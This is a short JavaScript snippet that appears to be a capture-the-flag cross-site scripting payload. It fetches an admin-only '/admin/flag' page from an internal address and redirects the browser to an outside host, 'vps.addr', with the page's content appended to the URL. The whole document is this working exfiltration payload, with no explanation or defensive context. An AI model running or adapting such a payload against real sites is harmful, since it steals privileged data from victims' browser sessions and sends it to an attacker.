fetch('http://10.62.20.153:3000/admin/flag').then((res) => {
    res.text().then((text) => {
        location.href = 'http://vps.addr/?flag=' + encodeURI(text);
    });
})
